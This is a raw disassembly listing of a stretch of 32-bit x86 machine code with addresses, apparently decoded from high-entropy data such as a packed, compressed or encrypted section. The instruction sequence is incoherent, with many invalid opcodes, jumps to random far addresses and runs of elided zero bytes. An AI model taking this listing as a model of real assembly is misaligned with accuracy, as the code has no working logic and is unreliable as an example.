  4218f1:	mov    esp,0x774c3ef4
  4218f6:	jg     0x42194d
  4218f8:	sub    edi,DWORD PTR [ecx-0x4df365e7]
  4218fe:	ins    BYTE PTR es:[edi],dx
  4218ff:	push   ebp
  421900:	cli    
  421901:	iret   
  421902:	call   0x677a38fd
  421907:	push   esp
  421908:	push   cs
  421909:	test   eax,0x6ce7ddd2
  42190e:	cdq    
  42190f:	mov    bl,0xf4
  421911:	adc    al,0xa7
  421913:	or     al,0x97
  421915:	mov    ebp,?
  421917:	das    
  421918:	and    BYTE PTR [ebx-0x4a704f93],cl
  42191e:	ja     0x42199e
  421920:	lea    ebp,[ecx-0x3cf521af]
  421926:	aaa    
  421927:	call   0xbc6b:0x200e6fc4
  42192e:	cmp    DWORD PTR [esi],esi
  421930:	jns    0x421992
  421932:	cld    
  421933:	mov    ds:0x2b099742,eax
  421938:	call   0xec9b:0x994c318d
  42193f:	stc    
  421940:	xchg   edi,eax
  421941:	push   DWORD PTR [edx]
  421943:	mov    edx,0xa7186855
  421948:	loope  0x4218f2
  42194a:	mov    ds:0x92e8a93a,eax
  42194f:	icebp  
  421950:	fxch   st(1)
  421952:	lods   eax,DWORD PTR ds:[esi]
  421953:	mov    DWORD PTR [ecx],edi
  421955:	jbe    0x4218fb
  421957:	cmp    ah,BYTE PTR [ebx+0x2720a464]
  42195d:	test   eax,0xfeb46f68
  421962:	jecxz  0x421989
  421964:	loopne 0x421921
  421966:	sbb    bl,BYTE PTR [edx-0x4b]
  421969:	cmp    BYTE PTR [edi],dl
  42196b:	into   
  42196c:	inc    ebp
  42196d:	(bad)  
  42196e:	xchg   edx,eax
  42196f:	ror    DWORD PTR [esp+esi*4-0x34],cl
  421973:	fst    st(7)
  421975:	loop   0x4219af
  421977:	cli    
  421978:	cmc    
  421979:	xchg   esi,eax
  42197a:	cdq    
  42197b:	sbb    dh,dh
  42197d:	or     eax,0xa51b2d95
  421982:	je     0x4219bb
  421984:	add    ebx,ecx
  421986:	ins    DWORD PTR es:[edi],dx
  421987:	out    dx,al
  421988:	pop    edx
  421989:	stc    
  42198a:	je     0x421967
  42198c:	(bad)  
  42198d:	(bad)  
  42198e:	xor    ah,cl
	...
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	loop   0x4219dc
  421a02:	cmc    
  421a03:	(bad)  
  421a05:	add    WORD PTR [eax],ax
  421a08:	add    al,0x1
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	sbb    eax,0x3f61990f
  421a11:	leave  
  421a12:	mov    ecx,0xbd3ce34f
  421a17:	popa   
  421a18:	inc    edi
  421a19:	mov    eax,0x7fbb358b
  421a1e:	aas    
  421a1f:	sbb    eax,0x2b9fb5be
  421a24:	push   edx
  421a25:	push   ebp
  421a26:	pop    edx
  421a27:	int    0xd7
  421a29:	(bad)  
  421a2a:	or     al,0xa3
  421a2c:	jns    0x4219bd
  421a2e:	test   eax,0xf906542c
  421a33:	pop    eax
  421a34:	add    DWORD PTR ds:0x54545de8,esi
  421a3a:	loope  0x421a72
  421a3c:	xor    DWORD PTR [edx-0xb1475e7],ebp
  421a42:	call   0xdc6e238e
  421a47:	cmp    dl,cl
  421a49:	push   ebp
  421a4a:	mov    ebx,0x713c0aac
  421a4f:	(bad)  
  421a50:	sub    DWORD PTR [ecx-0x3b],ebp
  421a53:	adc    eax,0x16879156
  421a58:	ja     0x421a51
  421a5a:	or     al,0xef
  421a5c:	inc    eax
  421a5d:	(bad)  
  421a5e:	call   0xdac:0xc79c9bcb
  421a65:	and    DWORD PTR [edi+0x45],0x81f29695
  421a6c:	out    0x8,al
  421a6e:	mov    al,0x3
  421a70:	xlat   BYTE PTR ds:[ebx]
  421a71:	dec    esp
  421a72:	fwait
  421a73:	dec    ebp
  421a74:	dec    ebx
  421a75:	push   0xffffffd6
  421a77:	sub    eax,0x85152eda
  421a7c:	and    DWORD PTR [ebx-0x29944e3a],edx
  421a82:	pop    edi
  421a83:	mov    eax,ds:0x1def454f
  421a88:	popf   
  421a89:	sahf   
  421a8a:	mov    eax,ds:0xf5d011e9
  421a8f:	je     0x421ac4
  421a91:	les    esi,FWORD PTR [edi+0x34]
  421a94:	jbe    0x421a69
  421a96:	adc    esi,DWORD PTR [eax-0x44]
  421a99:	push   ax
  421a9b:	xchg   esp,eax
  421a9c:	adc    DWORD PTR [eax+0x79db2e90],edi
  421aa2:	jmp    0x6792:0x314ce826
  421aa9:	into   
  421aaa:	sub    dh,BYTE PTR [ebx]
  421aac:	jge    0x421ad4
  421aae:	cdq    
  421aaf:	out    dx,eax
  421ab0:	mov    esi,0xfffcfe90
  421ab5:	cmp    BYTE PTR [ecx+ebp*1-0x23a704b5],dh
  421abc:	mov    eax,ss:0xa09aacde
  421ac2:	pop    ebx
  421ac3:	loopne 0x421a8d
  421ac5:	or     DWORD PTR [edi+eiz*1],0x5c0c7b63
  421acc:	mov    bl,0x72
  421ace:	cwde   
  421acf:	jbe    0x421a6e
  421ad1:	push   eax
  421ad2:	aaa    
  421ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ad4:	ja     0x421aa6
  421ad6:	add    dl,BYTE PTR [esi-0x3d42f734]
  421adc:	jb     0x421b40
  421ade:	inc    ecx
  421adf:	in     al,0xd6
  421ae1:	popa   
  421ae2:	add    eax,DWORD PTR [esi+0x1f]
  421ae5:	cld    
  421ae6:	push   0xffffffdd
  421ae8:	mov    esi,0x6a7c6274
  421aed:	dec    edi
  421aee:	adc    ecx,DWORD PTR [edi]
  421af0:	mov    dh,0xbb
  421af2:	sub    esi,esi
  421af4:	add    eax,0xf73cc304
  421af9:	jo     0x421b6e
  421afb:	cmp    al,0xbe
  421afd:	data16 mov ah,BYTE PTR [esi+0x1214460a]
  421b04:	add    BYTE PTR [ecx+0x59],ch
  421b07:	lock and edi,DWORD PTR [ebx-0x5b]
  421b0b:	add    al,0xae
  421b0d:	xor    ecx,ebp
  421b0f:	sti    
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     cl,BYTE PTR [esi+edx*8+0x70]
  421b83:	mov    gs,WORD PTR [eax]
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    al,0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	stos   DWORD PTR es:[edi],eax
  421b8d:	xchg   bh,dh
  421b8f:	out    dx,al
  421b90:	jecxz  0x421bca
  421b92:	outs   dx,DWORD PTR ds:[esi]
  421b93:	fiadd  DWORD PTR [ebp-0x58c33ab4]
  421b99:	adc    DWORD PTR [esi],ebp
  421b9b:	int    0x9b
  421b9d:	jge    0x421b42
  421b9f:	das    
  421ba0:	mov    edi,ecx
  421ba2:	mov    dl,0x90
  421ba4:	outs   dx,DWORD PTR ds:[esi]
  421ba5:	sbb    eax,0x6f5c8367
  421baa:	cld    
  421bab:	rcl    BYTE PTR [ebx],cl
  421bad:	fnstsw WORD PTR [ecx-0x33f9f497]
  421bb3:	ja     0x421b75
  421bb5:	aad    0xd4
  421bb7:	js     0x421bbd
  421bb9:	into   
  421bba:	data16 icebp 
  421bbc:	lahf   
  421bbd:	stos   BYTE PTR es:[edi],al
  421bbe:	inc    esi
  421bbf:	(bad)  
  421bc0:	out    dx,eax
  421bc1:	xchg   edx,eax
  421bc2:	inc    ecx
  421bc3:	mov    bl,0x4
  421bc5:	arpl   WORD PTR [ecx],cx
  421bc7:	punpckhwd mm4,QWORD PTR [edx-0x7b]
  421bcb:	mov    DWORD PTR ds:0xabc9dd3f,edx
  421bd1:	mov    ch,0x73
  421bd3:	mov    ebp,0x8e43fb5b
  421bd8:	mov    ebx,0xa84dfbad
  421bdd:	shl    DWORD PTR [edx],1
  421bdf:	sub    BYTE PTR [ebx+0x35],ch
  421be2:	(bad)  
  421be3:	fnstenv [edx-0x61b940af]
  421be9:	std    
  421bea:	jns    0x421bd0
  421bec:	stos   BYTE PTR es:[edi],al
  421bed:	into   
  421bee:	cmp    dl,BYTE PTR [ecx]
  421bf0:	shl    BYTE PTR [ecx],cl
  421bf2:	lods   al,BYTE PTR ds:[esi]
  421bf3:	inc    eax
  421bf4:	nop
  421bf5:	sub    al,0xc5
  421bf7:	js     0x421c10
  421bf9:	fstp   DWORD PTR [esi]
  421bfb:	test   DWORD PTR ds:0x11da89e5,esp
  421c01:	push   ss
  421c02:	mov    ebp,0xcd8486f0
  421c07:	fbstp  TBYTE PTR [eax+0x512eabb3]
  421c0d:	mov    ds:0xec87dd72,al
  421c12:	mov    bh,0xf0
  421c14:	std    
  421c15:	stc    
  421c16:	std    
  421c17:	sbb    esi,DWORD PTR [edx]
  421c19:	imul   esp,DWORD PTR [ebp-0x133d5479],0x90ae0f53
  421c23:	mov    ds:0x1fb31b27,al
  421c28:	daa    
  421c29:	cdq    
  421c2a:	or     DWORD PTR [esp+ebp*2-0x679b2bd],eax
  421c31:	dec    ebp
  421c32:	xor    esi,esi
  421c34:	fimul  DWORD PTR ds:0xb2ea86b0
  421c3a:	adc    esp,DWORD PTR [edx-0x577a11a0]
  421c40:	dec    ebp
  421c41:	pop    ss
  421c42:	sahf   
  421c43:	adc    al,0x19
  421c45:	loopne 0x421cc1
  421c47:	les    ecx,FWORD PTR [edi]
  421c49:	dec    esi
  421c4a:	pop    ecx
  421c4b:	cmp    dl,BYTE PTR [edi-0x6cd7f49a]
  421c51:	in     eax,0x1d
  421c53:	add    DWORD PTR [edx],edi
  421c55:	jle    0x421c72
  421c57:	and    eax,0xbcf12030
  421c5c:	inc    ebx
  421c5d:	xchg   BYTE PTR [ecx],cl
  421c5f:	dec    esi
  421c60:	sbb    DWORD PTR [edx+0x18],eax
  421c63:	pop    edx
  421c64:	sbb    BYTE PTR [esi],0xca
  421c67:	and    edx,DWORD PTR ds:0xe06a4faa
  421c6d:	pushf  
  421c6e:	or     esp,DWORD PTR [eax]
  421c70:	(bad)  
  421c71:	icebp  
  421c72:	cmp    BYTE PTR [eax-0x770f5a7f],cl
  421c78:	and    eax,0xd3c7dc22
  421c7d:	dec    esp
  421c7e:	pop    ecx
  421c7f:	lds    edx,FWORD PTR ds:0x4c5a4c2b
  421c85:	mov    ch,0x82
  421c87:	mov    dh,0x3e
  421c89:	xchg   esp,eax
  421c8a:	sub    edx,DWORD PTR [ebx]
  421c8c:	shl    DWORD PTR [ebp+0x67],1
  421c8f:	adc    eax,DWORD PTR [eax]
	...
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	pop    esp
  421d01:	pop    ss
  421d02:	jmp    0x1aa49cf
  421d07:	add    BYTE PTR [ecx+eax*1],al
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	and    BYTE PTR [ebx+0x3b],al
  421d0f:	repz je 0x421d43
  421d12:	push   ebx
  421d13:	in     eax,dx
  421d14:	mov    ebx,0x39d67a90
  421d19:	xor    ch,dl
  421d1b:	leave  
  421d1c:	(bad)  
  421d1d:	lds    edi,FWORD PTR [eax+ebp*2]
  421d20:	outs   dx,DWORD PTR ds:[esi]
  421d21:	es push edx
  421d23:	push   ebp
  421d24:	sub    ecx,ecx
  421d26:	dec    edi
  421d27:	mov    gs,WORD PTR [eax+0x2d]
  421d2a:	loop   0x421cf1
  421d2c:	test   BYTE PTR [esi-0x2f],bl
  421d2f:	pusha  
  421d30:	fmul   DWORD PTR [edi-0x7278c30b]
  421d36:	xchg   edx,eax
  421d37:	sub    ebp,DWORD PTR [ecx-0x184b08ec]
  421d3d:	into   
  421d3e:	shr    DWORD PTR [ecx+0x618a321d],1
  421d44:	xchg   ebx,eax
  421d45:	sbb    DWORD PTR [ebp-0x279cac8d],0x640394be
  421d4f:	bound  ebp,QWORD PTR [esi]
  421d51:	js     0x421d0f
  421d53:	call   0xacad:0xea307a8b
  421d5a:	or     eax,0x6e9c4b62
  421d5f:	add    al,bh
  421d61:	sbb    al,0x70
  421d63:	xchg   esi,eax
  421d64:	dec    ecx
  421d65:	icebp  
  421d66:	pop    edi
  421d67:	in     al,0xc7
  421d69:	adc    BYTE PTR [esi],bh
  421d6b:	outs   dx,DWORD PTR ds:[esi]
  421d6c:	in     eax,dx
  421d6d:	in     al,0x72
  421d6f:	push   0xfffffff3
  421d71:	mov    esp,0x8f551ca6
  421d76:	mov    ebx,0x3a0c6bdf
  421d7b:	stc    
  421d7c:	inc    eax
  421d7d:	rcl    DWORD PTR [ebp-0x66],1
  421d80:	into   
  421d81:	cwde   
  421d82:	out    0x63,eax
  421d84:	inc    esp
  421d85:	push   edx
  421d86:	jb     0x421d9b
  421d88:	ins    BYTE PTR es:[edi],dx
  421d89:	cmp    eax,0xf5eee0cf
  421d8e:	pusha  
  421d8f:	adc    ebp,DWORD PTR [ebx]
  421d91:	and    eax,0x1aef84c6
  421d96:	and    cl,BYTE PTR ds:0xc6b8d1d3
  421d9c:	sbb    esp,DWORD PTR [edi+0x55]
  421d9f:	cmp    BYTE PTR [edx+0x5f77f5b4],bl
  421da5:	jo     0x421dd1
  421da7:	cmc    
  421da8:	mov    dh,0x3f
  421daa:	test   eax,0xa90fd655
  421daf:	xchg   ecx,eax
  421db0:	shl    DWORD PTR [edi-0x70],cl
  421db3:	adc    edi,eax
  421db5:	push   esp
  421db6:	add    bl,BYTE PTR [edi+0x668c2d4b]
  421dbc:	ret    0x1388
  421dbf:	cmp    cl,0xb2
  421dc2:	add    al,0xb7
  421dc4:	out    dx,al
  421dc5:	mov    ebp,ss
  421dc7:	retf   
  421dc8:	loope  0x421e14
  421dca:	cmp    dh,BYTE PTR [ebp-0x3]
  421dcd:	test   al,0x78
  421dcf:	dec    edi
  421dd0:	jle    0x421e4c
  421dd2:	adc    eax,0x9c0a81d5
  421dd7:	dec    esi
  421dd8:	cmp    al,0xc2
  421dda:	pop    esp
  421ddb:	push   eax
  421ddc:	mov    bh,0xa2
  421dde:	pop    edi
  421ddf:	les    eax,FWORD PTR [ebp-0x41c3e652]
  421de5:	push   edi
  421de6:	arpl   WORD PTR [esi+eax*1+0x1b],ax
  421dea:	fist   DWORD PTR gs:[ebx-0x83081d3]
  421df1:	call   0xfcc7:0x71b95f6
  421df8:	dec    eax
  421df9:	jno    0x421e6f
  421dfb:	int3   
  421dfc:	mov    ds:0x9c239f37,al
  421e01:	int    0x3e
  421e03:	cmp    esi,DWORD PTR [esi-0x3a]
  421e06:	lods   al,BYTE PTR ds:[esi]
  421e07:	hlt    
  421e08:	push   edx
  421e09:	sub    al,0x5c
  421e0b:	sti    
  421e0c:	sub    eax,0x37f016
	...
  421e71:	add    BYTE PTR [eax],al
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	or     ecx,0xffffffba
  421e83:	xchg   esi,eax
  421e84:	xor    BYTE PTR [ecx+0x1],ch
  421e87:	add    BYTE PTR [ecx+eax*1],al
  421e8a:	add    BYTE PTR [eax],al
  421e8c:	pandn  mm4,QWORD PTR [ebx-0x6c5bd23d]
  421e93:	push   ds
  421e94:	adc    ebx,0xffffffeb
  421e97:	daa    
  421e98:	rol    ecx,1
  421e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e9b:	inc    ebx
  421e9c:	in     al,dx
  421e9d:	sub    eax,0x75d6cad2
  421ea2:	jns    0x421e8f
  421ea4:	push   ebp
  421ea5:	sbb    DWORD PTR [edx],ebp
  421ea7:	test   eax,0x7292f073
  421eac:	push   0x43
  421eae:	lock sub ecx,DWORD PTR [eax+0x72]
  421eb2:	icebp  
  421eb3:	jp     0x421ecb
  421eb5:	stos   DWORD PTR es:[edi],eax
  421eb6:	stc    
  421eb7:	xor    eax,0x5e5195d4
  421ebc:	cdq    
  421ebd:	mov    eax,0x6705f87a
  421ec2:	std    
  421ec3:	aaa    
  421ec4:	xor    cl,ch
  421ec6:	sti    
  421ec7:	fidivr WORD PTR [edi-0x7b]
  421eca:	add    DWORD PTR ds:0xe0623784,ebx
  421ed0:	int3   
  421ed1:	dec    edx
  421ed2:	pop    edi
  421ed3:	xchg   ebx,eax
  421ed4:	ins    BYTE PTR es:[edi],dx
  421ed5:	cmp    eax,0x7c3552fd
  421eda:	or     BYTE PTR ds:0x14b062d8,ch
  421ee0:	je     0x421ecf
  421ee2:	ins    DWORD PTR es:[edi],dx
  421ee3:	mov    al,dh
  421ee5:	pop    edx
  421ee6:	int3   
  421ee7:	pushf  
  421ee8:	pusha  
  421ee9:	clc    
  421eea:	pusha  
  421eeb:	(bad)  
  421eec:	xchg   esp,eax
  421eed:	mov    BYTE PTR [eax+0x1da3f8fa],ch
  421ef3:	retf   0x161
  421ef6:	ficomp DWORD PTR [esi-0x5e]
  421ef9:	cmp    esi,eax
  421efb:	xchg   ebx,eax
  421efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421efd:	jb     0x421eb9
  421eff:	call   0xb6889a47
  421f04:	clc    
  421f05:	popf   
  421f06:	mov    cl,0xec
  421f08:	dec    eax
  421f09:	aas    
  421f0a:	and    DWORD PTR [esi+0x3c3eefbf],ebx
  421f10:	xchg   ecx,eax
  421f11:	out    0x5,eax
  421f13:	(bad)  
  421f14:	repnz sti 
  421f16:	pop    edx
  421f17:	and    al,0x80
  421f19:	sbb    eax,0x2d98e892
  421f1e:	lods   eax,DWORD PTR ds:[esi]
  421f1f:	retf   0x3d02
  421f22:	ficom  DWORD PTR [ebx+eiz*8]
  421f25:	add    DWORD PTR [esi],0xcdb7e5ae
  421f2b:	jae    0x421f91
  421f2d:	adc    ah,0xb0
  421f30:	adc    dl,BYTE PTR [eax-0x70]
  421f33:	(bad)  
  421f35:	mov    BYTE PTR [esi+ecx*1+0x21820447],dh
  421f3c:	mov    edi,0xd23d24b3
  421f41:	and    bl,BYTE PTR [ebp-0x2c]
  421f44:	retf   0x81ea
  421f47:	fistp  QWORD PTR [esi]
  421f49:	adc    al,BYTE PTR [eax]
  421f4b:	fsub   QWORD PTR [ebx-0x64]
  421f4e:	mov    ds:0xc1056f21,eax
  421f53:	mov    edx,0xdb3220bd
  421f58:	lods   eax,DWORD PTR ds:[esi]
  421f59:	test   al,0x8
  421f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f5c:	jge    0x421ef4
  421f5e:	adc    eax,0x10fa16ad
  421f63:	mov    ebp,0x15440ff
  421f68:	imul   esi,DWORD PTR [ecx-0x6e56ad63],0x760aff92
  421f72:	mov    ch,BYTE PTR [ebx]
  421f74:	dec    edi
  421f75:	push   eax
  421f76:	(bad)  
  421f77:	pop    es
  421f78:	mov    ds:0xb2049f8,al
  421f7d:	gs xor al,0x4f
  421f80:	inc    ecx
  421f81:	gs out 0xfd,al
  421f84:	fldenv [ebx+0x444b45f3]
  421f8a:	inc    esi
  421f8b:	sbb    ebp,esp
  421f8d:	shr    BYTE PTR [edi+0x4e],0x0
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	imul   cx,WORD PTR [edi],0x9a2f
  422004:	xor    al,0x6a
  422006:	add    DWORD PTR [eax],eax
  422008:	add    al,0x1
  42200a:	add    BYTE PTR [eax],al
  42200c:	dec    ecx
  42200d:	fld    DWORD PTR [ebx]
  42200f:	jb     0x421fd0
  422011:	test   eax,0x9d8e3268
  422016:	ror    DWORD PTR [edx+edi*1-0x55f7a670],0xbc
  42201e:	nop
  42201f:	pop    edx
  422020:	iret   
  422021:	sub    BYTE PTR [eax-0x6d],bl
  422024:	cmp    BYTE PTR [esi+0x47166303],dh
  42202a:	icebp  
  42202b:	mov    bl,0x1c
  42202d:	jle    0x422039
  42202f:	push   esp
  422030:	fsub   DWORD PTR [ebx-0x5de1999c]
  422036:	mov    WORD PTR [eax-0x2cf4eafa],gs
  42203c:	cmp    ch,BYTE PTR [edi]
  42203e:	stc    
  42203f:	push   ecx
  422040:	shl    ah,0xbf
  422043:	cld    
  422044:	xor    DWORD PTR [ecx],esp
  422046:	push   0x1c47fc68
  42204b:	xor    al,0xf
  42204d:	sbb    al,0x25
  42204f:	inc    edx
  422050:	std    
  422051:	test   DWORD PTR ds:0xf4224e68,ebp
  422057:	add    DWORD PTR [ebx+0x4401f32c],ecx
  42205d:	aad    0x70
  42205f:	mov    WORD PTR [edi+edi*8+0x363af86c],?
  422066:	mov    al,0xa7
  422068:	pop    ecx
  422069:	push   ss
  42206a:	stos   DWORD PTR es:[edi],eax
  42206b:	and    al,0x31
  42206d:	cmp    BYTE PTR [ecx+esi*1+0x72],ah
  422071:	jb     0x421ff4
  422073:	pop    es
  422074:	jo     0x4220d1
  422076:	sar    DWORD PTR [esp+edi*1+0x444a2fca],cl
  42207d:	mov    bh,0xc9
  42207f:	mov    al,ds:0xadabacb6
  422084:	mov    eax,0x77468e7f
  422089:	int    0x3f
  42208b:	sbb    eax,0xdacd02a8
  422090:	sub    eax,0x850df0df
  422095:	test   BYTE PTR [eax+0x54e32ab3],cl
  42209b:	pop    es
  42209c:	lahf   
  42209d:	outs   dx,DWORD PTR ds:[esi]
  42209e:	cmc    
  42209f:	call   0x3d34:0xef15498e
  4220a6:	test   BYTE PTR [ebp-0x67],ch
  4220a9:	sbb    BYTE PTR [esi-0x64],bl
  4220ac:	add    ebp,ebx
  4220ae:	cmp    al,0x51
  4220b0:	push   eax
  4220b1:	(bad)  
  4220b2:	jne    0x42211f
  4220b4:	sbb    edx,esi
  4220b6:	rol    BYTE PTR [eax],0x59
  4220b9:	enter  0x743d,0x28
  4220bd:	cs mov ecx,0xd24dc9e2
  4220c3:	jo     0x422050
  4220c5:	lea    edx,[edx-0x68]
  4220c8:	and    eax,ecx
  4220ca:	dec    ebp
  4220cb:	mov    dh,0xee
  4220cd:	mov    al,ds:0x9ca29b5c
  4220d2:	push   0xb3ea5424
  4220d7:	test   al,0xc4
  4220d9:	xchg   edx,eax
  4220da:	xor    cl,0x9
  4220dd:	adc    bh,al
  4220df:	sbb    esp,DWORD PTR [ebx+0x41]
  4220e2:	pop    ecx
  4220e3:	nop
  4220e4:	(bad)  
  4220e6:	inc    edi
  4220e7:	push   edx
  4220e8:	nop
  4220e9:	adc    edi,DWORD PTR [esi+edi*4]
  4220ec:	sub    dl,BYTE PTR [edi-0x3b]
  4220ef:	inc    eax
  4220f0:	fcom   DWORD PTR [esi]
  4220f2:	loopne 0x4220ad
  4220f4:	leave  
  4220f5:	dec    edx
  4220f6:	pop    esi
  4220f7:	push   0xd156f0b1
  4220fc:	mov    al,0x3d
  4220fe:	lea    edi,[edx+0x4f]
  422101:	xor    BYTE PTR [esp+ebp*2],0xd0
  422105:	retf   0xc46d
  422108:	cld    
  422109:	outs   dx,DWORD PTR ds:[esi]
  42210a:	mov    bh,0x12
  42210c:	xchg   esi,eax
  42210d:	xchg   edx,eax
  42210e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42210f:	mov    DWORD PTR [eax],eax
	...
  422171:	add    BYTE PTR [eax],al
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    esi,DWORD PTR [esi+0x38818ba2]
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    al,0x1
  42218a:	add    BYTE PTR [eax],al
  42218c:	or     eax,0xd0466b1d
  422191:	daa    
  422192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422193:	aas    
  422194:	sub    BYTE PTR ds:0xa3b7eeef,ch
  42219a:	jns    0x422149
  42219c:	pop    edi
  42219d:	jae    0x4221a1
  42219f:	xchg   ecx,eax
  4221a0:	rcr    BYTE PTR [edx-0x68e06dc5],0x6e
  4221a7:	ins    BYTE PTR es:[edi],dx
  4221a8:	fisttp WORD PTR [eax+0x58]
  4221ab:	(bad)  
  4221ac:	rcl    ebx,cl
  4221ae:	inc    ebx
  4221af:	stos   BYTE PTR es:[edi],al
  4221b0:	dec    ebx
  4221b1:	mov    eax,0x3d58884e
  4221b6:	iret   
  4221b7:	pop    ebx
  4221b8:	jae    0x42219f
  4221ba:	(bad)  [eax+0x403f0bb4]
  4221c0:	push   DWORD PTR [ecx+0x79]
  4221c3:	cld    
  4221c4:	mov    bh,ah
  4221c6:	lea    ebp,[ebx-0x27]
  4221c9:	pop    esi
  4221ca:	mov    al,dh
  4221cc:	inc    esp
  4221cd:	mov    esp,0x50acc77c
  4221d2:	jmp    0x422209
  4221d4:	loopne 0x4221d1
  4221d6:	pop    esi
  4221d7:	and    dl,BYTE PTR [edx+0x3a9a669b]
  4221dd:	out    0x77,eax
  4221df:	out    0xf9,eax
  4221e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221e2:	mov    edx,0x3e1b6c1a
  4221e7:	mov    al,BYTE PTR [edx+0x2dd387e0]
  4221ed:	loope  0x42218b
  4221ef:	add    BYTE PTR [ebp+0x79d87c32],al
  4221f5:	mov    al,0x82
  4221f7:	jae    0x42222d
  4221f9:	outs   dx,DWORD PTR ds:[esi]
  4221fa:	mov    dh,0xd3
  4221fc:	(bad)  
  4221fd:	repnz xchg esi,eax
  4221ff:	mov    esp,0x438a1c81
  422204:	xor    al,0x12
  422206:	outs   dx,BYTE PTR ds:[esi]
  422207:	sahf   
  422208:	bswap  esp
  42220a:	mov    BYTE PTR [eax-0xf],ch
  42220d:	mov    ?,WORD PTR [edi]
  42220f:	pop    esp
  422210:	cmp    BYTE PTR [esi],cl
  422212:	xor    BYTE PTR [esp+eax*8-0x49],cl
  422216:	(bad)  
  422217:	jnp    0x422288
  422219:	adc    ch,BYTE PTR [edi]
  42221b:	aad    0x5b
  42221d:	rcl    DWORD PTR [ebx-0x6403ccb1],cl
  422223:	xchg   BYTE PTR ds:0x75dc3ae1,ch
  422229:	xchg   esp,eax
  42222a:	fisub  WORD PTR [esi]
  42222c:	pusha  
  42222d:	xor    esi,edi
  42222f:	push   cs
  422230:	daa    
  422231:	mov    WORD PTR [eax-0x25],ds
  422234:	jg     0x422272
  422236:	into   
  422237:	jmp    0xf1dc3cf1
  42223c:	rcr    DWORD PTR [ebx+eiz*4],0x47
  422240:	bound  edi,QWORD PTR [ebx+0x6777249]
  422246:	cmp    ah,BYTE PTR [eax]
  422248:	loope  0x4221dc
  42224a:	xor    al,0x62
  42224c:	out    dx,al
  42224d:	inc    esp
  42224e:	arpl   WORD PTR [edx+0x41],ax
  422251:	std    
  422252:	pop    ebp
  422253:	sub    DWORD PTR [esp+ecx*1],edx
  422256:	sbb    DWORD PTR ds:0xf0736118,eax
  42225c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42225e:	or     BYTE PTR ds:0x2ae2ce95,dh
  422264:	ret    0x9d3d
  422267:	fst    QWORD PTR [ecx-0x70109e48]
  42226d:	(bad)  
  42226e:	int3   
  42226f:	adc    ebx,DWORD PTR [ebx]
  422271:	or     ebx,DWORD PTR [ecx]
  422273:	fsubr  DWORD PTR [ebp+edi*8-0x2b]
  422277:	mov    ds:0x71387d4d,al
  42227c:	jmp    0x1a2:0xf3785b57
  422283:	call   0x5020:0xc6493697
  42228a:	lds    ebx,FWORD PTR [edx+0x36]
  42228d:	test   ah,bl
  42228f:	xor    DWORD PTR [eax],eax
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	ins    BYTE PTR es:[edi],dx
  422301:	jb     0x4222fa
  422303:	clc    
  422304:	cmp    al,0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	xchg   ebp,eax
  42230d:	jmp    0x42235d
  42230f:	iret   
  422310:	mov    dl,0x97
  422312:	mov    ds:0x4b54c003,eax
  422317:	adc    al,0xc0
  422319:	pop    ss
  42231a:	sahf   
  42231b:	pushf  
  42231c:	rcl    esi,0x55
  42231f:	out    0xcf,al
  422321:	pop    ecx
  422322:	retf   
  422323:	outs   dx,DWORD PTR ds:[esi]
  422324:	mov    al,ds:0x6e71457d
  422329:	sti    
  42232a:	test   dl,0x71
  42232d:	jmp    0x88274788
  422332:	mov    WORD PTR [edi+0x44],ds
  422335:	pushf  
  422336:	ficomp DWORD PTR ds:0xc9973a25
  42233c:	sbb    ecx,DWORD PTR [ebx-0x6a7dcac3]
  422342:	dec    edx
  422343:	jge    0x42234d
  422345:	inc    esp
  422346:	adc    al,0x6e
  422348:	xchg   ecx,eax
  422349:	cs sub eax,0xa19faaf0
  42234f:	mov    ecx,0xead8a9e2
  422354:	aaa    
  422355:	mov    cl,0x95
  422357:	fild   DWORD PTR [esi]
  422359:	loope  0x422342
  42235b:	mov    al,ds:0x44c782bd
  422360:	sub    eax,0xe3a38085
  422365:	inc    edi
  422366:	push   esp
  422367:	jl     0x422392
  422369:	mov    ebp,esp
